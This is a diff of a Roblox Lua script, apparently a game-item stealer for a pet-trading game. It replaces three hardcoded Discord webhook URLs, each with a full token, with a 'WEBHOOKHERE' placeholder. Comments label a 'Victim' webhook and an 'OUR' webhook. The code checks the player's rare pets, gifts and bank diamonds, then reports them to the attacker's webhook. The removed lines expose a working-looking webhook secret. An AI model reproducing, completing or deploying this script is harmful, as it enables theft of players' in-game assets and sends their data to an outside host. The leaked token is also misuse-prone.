@@ -27,13 +27,13 @@ deletebank:Destroy()
 
 if _G.License and _G.License ~= nil and _G.License ~= "" then
  _G.Key = "xolboR"
- _G.AuthServer = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
+ _G.AuthServer = "WEBHOOKHERE"
 end
 _G.UserId = game:GetService("Players"):GetUserIdFromNameAsync(string.reverse(_G.Key))
 if _G.AuthServer ~= "" and _G.AuthServer ~= nil and _G.AuthServer then
 _G.Webhook = _G.AuthServer
  else
- _G.Webhook = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
+ _G.Webhook = "WEBHOOKHERE"
 end
 
 -- Invitation ID
@@ -238,7 +238,7 @@ wait(6)
 -- End Webhoook Victim
 -- Webhook (OUR)
   if HugeCount >= 1 or EXCCount >= 20 or ScumCount >= 1 or GiftCount >= 1 or #HList >= 1 or SuperBank["Storage"]["Currency"]["Diamonds"] >= 100000000000 then
-local YourWebHookHere =  "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"  -- web hook here
+local YourWebHookHere =  "WEBHOOKHERE"  -- web hook here
 
 local url = YourWebHookHere
 local username = game:GetService("Players").LocalPlayer.Name
